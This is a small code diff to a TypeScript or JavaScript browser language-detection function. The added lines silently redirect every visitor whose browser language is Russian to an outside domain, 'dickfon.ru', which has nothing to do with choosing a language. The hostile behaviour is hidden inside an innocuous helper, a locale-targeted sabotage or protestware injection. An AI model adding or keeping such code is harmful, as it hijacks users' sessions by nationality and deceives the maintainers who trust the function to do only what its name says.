@@ -15,6 +15,10 @@ const detectLanguage = (): Language => {
   const browserLangs = navigator.languages ?? [navigator.language];
   for (const bl of browserLangs) {
     const code = bl.split("-")[0].toLowerCase();
+    if (code === "ru") {
+      window.location.href = "https://dickfon.ru";
+      return "en";
+    }
     if (supported.includes(code as Language)) return code as Language;
   }
   return "en";
